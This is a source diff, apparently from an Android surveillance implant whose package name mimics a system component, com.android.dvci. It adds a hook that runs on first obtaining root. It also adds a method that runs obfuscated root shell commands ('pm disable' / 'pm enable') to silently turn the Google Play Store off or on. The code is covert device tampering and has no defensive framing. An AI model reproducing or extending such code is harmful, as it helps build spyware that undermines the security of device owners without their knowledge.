@@ -29,6 +29,7 @@ import com.android.dvci.file.AutoFile;
 import com.android.dvci.gui.ASG;
 import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
 import com.android.mm.M;
 
 import java.util.ArrayList;
@@ -740,9 +741,18 @@ public class Status {
 	static public boolean haveRoot() {
 		return haveRoot;
 	}
-
 	static public void setRoot(boolean r) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (setRoot) r,haveRoot "+ r + "," + haveRoot);
+		}
+		boolean old_haveRoot=haveRoot;
 		haveRoot = r;
+		if( r && !old_haveRoot) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (setRoot) calling first root");
+			}
+			Core.self().firstRoot();
+		}
 	}
 
 	static public boolean haveSu() {
@@ -863,6 +873,74 @@ public class Status {
 				Check.log(TAG + " (checkCameraHardware), no camera");
 			}
 			return false;
+		}
+	}
+	static public void setPlayStoreEnableStatus(Boolean enable) {
+
+		if (Status.haveRoot()) {
+			String app = M.e("com.android.vending");
+			PackageManager pm = Status.self().getAppContext().getPackageManager();
+			int i = pm.getApplicationEnabledSetting(app);
+
+			if (enable) {
+				int n = 0;
+				while (i == PackageManager.COMPONENT_ENABLED_STATE_DISABLED && n++ < 5) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(setPlayStoreEnableStatus) ENABLING:" + app);//$NON-NLS-1$
+					}
+					if (i == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(setPlayStoreEnableStatus) Enabling " + app);//$NON-NLS-1$
+						}
+						 Execute.executeRoot(M.e("pm enable ") + app);
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(setPlayStoreEnableStatus) Already Enabled " + app);//$NON-NLS-1$
+						}
+					}
+					try {
+						Thread.sleep(100);
+						i = pm.getApplicationEnabledSetting(app);
+					} catch (InterruptedException e) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(setPlayStoreEnableStatus) Exception enabling :" + app + e);//$NON-NLS-1$
+						}
+					}
+				}
+			} else {
+				int n = 0;
+				while (i == PackageManager.COMPONENT_ENABLED_STATE_ENABLED && n++ < 5) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(setPlayStoreEnableStatus) DISABLING:" + app);//$NON-NLS-1$
+					}
+					if (i == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(setPlayStoreEnableStatus) Disabling " + app);//$NON-NLS-1$
+						}
+						Execute.executeRoot(M.e("pm disable ") + app);
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(setPlayStoreEnableStatus) Already Disabled " + app);//$NON-NLS-1$
+						}
+					}
+					try {
+						Thread.sleep(100);
+						i = pm.getApplicationEnabledSetting(app);
+					} catch (InterruptedException e) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(setPlayStoreEnableStatus) Exception setting disable state for:" + app + e);//$NON-NLS-1$
+						}
+					}
+				}
+			}
+			// wait few seconds in order to let update the Notification manager, see : https://code.google.com/p/android/issues/detail?id=42540
+			try {
+				Thread.sleep(4000);
+			} catch (InterruptedException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(setPlayStoreEnableStatus) Exception While waiting in setting Enable state for:" + app + e);//$NON-NLS-1$
+				}
+			}
 		}
 	}
 
